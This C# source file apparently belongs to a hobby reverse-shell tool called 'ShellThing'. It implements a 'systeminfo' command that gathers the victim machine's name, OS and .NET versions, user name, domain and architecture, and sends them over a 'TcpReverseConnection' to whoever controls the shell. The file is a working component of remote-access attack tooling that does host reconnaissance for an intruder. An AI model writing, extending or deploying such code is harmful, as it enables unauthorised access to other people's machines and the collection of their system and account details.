using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace ShellThing
{
    class SystemInfoCommand : ICommand
    {
        TcpReverseConnection connection;

        public void Execute(TcpReverseConnection connection, string[] commandArguments)
        {
            this.connection = connection;

            //This is what will return when the systeminfo command is run is this shell
            connection.SendData($"MachineName: {Environment.MachineName}\n");
            connection.SendData($"OSVersion: {Environment.OSVersion}\n");
            connection.SendData($"dotNETVersion: {Environment.Version}\n");
            connection.SendData($"UserName: {Environment.UserName}\n");
            connection.SendData($"DomainName: {Environment.UserDomainName}\n");
            //connection.SendData($"Architecture: {Environment.Is64BitOperatingSystem}");
            //The above line returns just true. I was trying to get the if statement below to accept the line above it but VS didn't like it. 
            bool is64Bit = Environment.Is64BitOperatingSystem;
            if (is64Bit)
            {
                connection.SendData($"Architecture: x64\n");
            }
            else
            {
                connection.SendData($"Archtecture: x86\n");
            }

        }

        public Dictionary<string, string> Help(bool includeSyntax)
        {
            Dictionary<string, string> helpText = new Dictionary<string, string>();

            helpText.Add("systeminfo", "Display the machine name the shell is currently running on.");

            return helpText;
        }
    }
}
